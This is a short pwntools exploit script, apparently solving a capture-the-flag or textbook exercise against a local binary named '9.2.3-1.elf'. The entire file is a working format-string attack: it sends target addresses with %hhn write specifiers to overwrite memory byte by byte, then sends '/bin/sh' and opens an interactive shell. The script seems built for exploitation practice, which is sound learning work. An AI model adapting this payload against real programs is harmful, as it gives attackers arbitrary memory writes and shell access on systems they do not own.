from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# io = gdb.debug('./9.2.3-1.elf', 'b main')

io = process('./9.2.3-1.elf')
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(io, 'b main')
# pause()

payload = "\x68\xb2\x04\x08" + "\x69\xb2\x04\x08" + "\x6a\xb2\x04\x08" + "\x6b\xb2\x04\x08" + "%240c%4$hhn" + "%61c%5$hhn" + "%163c%6$hhn" + "%215c%7$hhn"
io.send(payload.encode())
io.send(b'/bin/sh')
# io.recv()
io.interactive()
